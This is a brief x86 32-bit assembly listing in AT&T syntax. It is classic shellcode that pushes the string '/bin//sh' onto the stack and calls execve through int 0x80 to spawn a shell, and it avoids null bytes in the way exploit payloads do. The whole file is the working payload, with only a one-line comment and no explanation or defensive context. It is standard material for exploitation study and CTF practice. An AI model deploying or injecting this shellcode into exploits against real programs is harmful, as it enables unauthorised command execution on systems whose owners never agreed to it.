#execve("/bin//sh",{"/bin//sh",NULL},NULL)

.section .text
.global _start
_start:
	xor %edx,%edx
	push %edx
	push $0x68732f2f
	push $0x6e69622f
	mov %esp,%ebx
	push %edx
	push %ebx
	mov %esp,%ecx
	lea 0xb(%edx),%eax
	int $0x80
